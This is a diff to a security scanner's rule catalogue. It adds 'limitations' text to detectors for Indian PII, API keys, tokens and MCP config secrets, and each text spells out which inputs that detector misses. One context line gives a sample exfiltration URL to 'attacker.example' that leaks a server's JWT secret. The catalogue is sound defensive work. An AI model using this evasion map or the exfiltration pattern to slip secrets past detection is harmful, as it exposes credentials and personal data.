@@ -2204,7 +2204,7 @@
       "cve_references": [],
       "description": "A 12-digit Aadhaar number passed the Verhoeff checksum and is embedded in project text. Aadhaar is restricted under the UIDAI Act and India DPDP \u00a78(4). Storing in code is a reportable breach.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads source, config and text files by extension (`.py`, `.ts`, `.json`, `.yaml`, `.toml`, `.txt`, `.md` and a few more) for a Verhoeff-valid Aadhaar number. Any other extension is never opened: the rows of a customer export saved as `.csv` are not reported, while the same rows in a `.txt` file are.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2226,7 +2226,7 @@
       "cve_references": [],
       "description": "A 10-char PAN (5 letters + 4 digits + 1 letter) was detected. PAN is tax-linked personal data under DPDP \u00a78(4).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads a PAN written in capitals: five letters, four digits and a letter. The same PAN in lower case (`abcde1234f`) is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2248,7 +2248,7 @@
       "cve_references": [],
       "description": "A UPI VPA (<handle>@<psp>) was detected. UPI IDs are payment identifiers regulated by NPCI and covered by DPDP \u00a78(4).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads a UPI ID only when the handle after the `@` is one of fifteen payment-app handles (`@oksbi`, `@ybl`, `@paytm`, `@upi` and eleven more). An ID at any other handle, such as `@kotak`, is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2270,7 +2270,7 @@
       "cve_references": [],
       "description": "An IFSC code (4 letters + 0 + 6 alnum) was detected. IFSC is a banking identifier; pairing it with an account number constitutes DPDP \u00a78(4) 'sensitive personal data'.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads an IFSC code written in capitals: four letters, a `0` and six letters or digits. The same code in lower case (`sbin0001234`) is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2292,7 +2292,7 @@
       "cve_references": [],
       "description": "An Indian +91 mobile number (starting 6/7/8/9) was detected. Phone numbers are personal data under DPDP \u00a78(4).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads a `+91` mobile number whose ten digits follow the country code without a break (`+91 9876543210`). The same number grouped in fives, `+91 98765 43210`, is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2314,7 +2314,7 @@
       "cve_references": [],
       "description": "An Indian state-issued vehicle registration (e.g. 'MH 12 AB 1234') was detected. Vehicle registrations are PII in combination with driver records.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads a registration only when it starts with one of 37 state and territory codes (`MH`, `DL`, `KA`, `TS` and so on). A code that is not on the list is not reported, and the list has no `TG`, the code Telangana has issued since 2024 in place of `TS`.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -4646,7 +4646,7 @@
       ],
       "description": "An MCP server resolves `${VAR}` / `$VAR` placeholders against its own process environment (`process.env` in Node, `os.environ` / `os.path.expandvars` in Python) while parsing or validating a user-supplied MCP server config \u2014 typically the server URL. An authenticated user can then submit a URL like `https://attacker.example/?k=${JWT_SECRET}` and the server interpolates its own secrets into the outbound request, exfiltrating them to an attacker-controlled host. This is the CVE-2026-32625 class (LibreChat <= 0.8.3 resolved `${VAR}` against `process.env` during Zod validation of user-supplied MCP server URLs, leaking `CREDS_KEY`, `JWT_SECRET`, `MONGO_URI`, etc.; CWE-200, CVSS 9.6). Detected as a `${...}`-placeholder resolver that reads the process environment (`.replace(/.../, ... process.env ...)`, `os.path.expandvars(...)`, `.format(**os.environ)`) inside an MCP-server config/URL path.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads Python and JavaScript/TypeScript files that mention MCP, and matches three resolver shapes: `os.path.expandvars(...)` and `.format(**os.environ)` or `.format_map(os.environ)` in Python, and a `.replace(...)` whose `${...}` replacer reads `process.env` in JavaScript or TypeScript. A resolver written another way is not reported: a Python `re.sub` that looks each `${NAME}` up in `os.environ` is missed.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9108,7 +9108,7 @@
       "cve_references": [],
       "description": "An Anthropic API key (sk-ant-*) was found in a project file. This allows full API access and billing abuse.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for `sk-ant-` followed by 20 or more key characters in files whose extension is on a fixed list (`.json`, `.yml`, `.toml`, `.py`, `.ts`, `.sh` and similar, plus `.env` files and Dockerfiles). A key in any other kind of file is not reported: one pasted into a Jupyter notebook (`.ipynb`) is missed, although the same content in a `.json` file is found.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9134,7 +9134,7 @@
       "cve_references": [],
       "description": "An OpenAI API key was found in a project file: a legacy user key (sk-*), or a project (sk-proj-*), service-account (sk-svcacct-*) or admin (sk-admin-*) key.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for the `sk-` shapes OpenAI issues: legacy user keys and the `sk-proj-`, `sk-svcacct-` and `sk-admin-` families. A key with no such prefix is not recognised, so an Azure OpenAI key, which is 32 hexadecimal characters, is not reported, although an `sk-proj-` key in the same place is.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9160,7 +9160,7 @@
       "cve_references": [],
       "description": "AWS access key ID or secret access key found in a project file.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for an `AKIA` access key ID and for a secret key written as the lower-case assignment `aws_secret_access_key = <40 characters>`. The same secret as the upper-case environment variable, `AWS_SECRET_ACCESS_KEY=<40 characters>`, is not reported, so a file that holds the secret without its key ID is missed.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9186,7 +9186,7 @@
       "cve_references": [],
       "description": "A value assigned to a secret-like key has high Shannon entropy, indicating a likely credential or API key.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `NAME=value` pairs and quoted values (`\"NAME\": \"value\"`) whose name contains SECRET, PASSWORD, TOKEN, KEY or CREDENTIAL, and reports a value of 16 or more characters whose Shannon entropy exceeds 4.5 bits per character. A secret drawn from a small alphabet cannot reach that: a 64-digit hexadecimal secret, such as the output of `openssl rand -hex 32`, tops out at 4 bits per character and is never reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9212,7 +9212,7 @@
       "cve_references": [],
       "description": "A private key file (*.pem, *.key, id_rsa, etc.) or PEM content was found in the project.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reports a private key by its file name (a `.pem`, `.key`, `.p12` or `.pfx` extension, or exactly `id_rsa`, `id_ed25519`, `id_ecdsa` or `id_dsa`) or by a PEM private-key header at the top of a `.crt` or `.cer` file. The same key pasted into any other file, such as a YAML deploy config, is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9238,7 +9238,7 @@
       "cve_references": [],
       "description": "A .env file exists but .gitignore does not contain a .env exclusion pattern.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for `.env` and `.env.*` files in the project root only. An env file in a subdirectory, such as `services/api/.env.example` in a monorepo, is not examined, even when the project has no `.gitignore` at all.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9264,7 +9264,7 @@
       "cve_references": [],
       "description": "Hardcoded secret values found in mcpServers env blocks in non-.mcp.json files.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `env` block of each server under a top-level `mcpServers` key in JSON files other than `.mcp.json`, and reports a hard-coded value whose variable name contains KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL, ANTHROPIC, OPENAI or AWS_. The name alone decides: a credential under any other name, such as a `DATABASE_URL` that carries `user:password@host`, is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9290,7 +9290,7 @@
       "cve_references": [],
       "description": "A GitHub or GitLab personal access token (ghp_*, github_pat_*, glpat-*) was found in a project file.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads GitHub personal access tokens (`ghp_` classic, `github_pat_` fine-grained) and GitLab `glpat-` tokens. GitHub's other token types are not reported: OAuth (`gho_`), GitHub App user (`ghu_`) and installation (`ghs_`), and refresh (`ghr_`) tokens.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9316,7 +9316,7 @@
       "cve_references": [],
       "description": "A Google Cloud service account key JSON file was found in the project.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reports a file with a `.json` extension that contains `\"type\": \"service_account\"`. The same key saved under another extension, such as `.yml`, is not reported.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -9644,7 +9644,7 @@
       "incident_references": [
         "SVD-2026-0405"
       ],
-      "limitations": "",
+      "limitations": "Reads a Splunk MCP config: `inputs.conf`, `splunk-mcp.yaml` or any file under a `splunk-mcp` directory. A YAML file is read as structure only when `inputs` or `sourcetypes` is a top-level list, so the same entries nested under another key, such as `splunk:`, are not reported.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -9675,7 +9675,7 @@
       "incident_references": [
         "SVD-2026-0405"
       ],
-      "limitations": "",
+      "limitations": "The log-call check reads calls on a receiver named `logger`, `logging`, `LOGGER` or `log` (and `print`, `console.*` and `System.out`) whose arguments carry a token-shaped literal or a variable named like `access_token`, `session_token`, `api_key` or `bearer`. A logger held under any other name is not recognised: the same call on `_logger`, `self._logger` or `LOG` is not reported.",
       "owasp_agentic_references": [
         "ASI04"
       ],
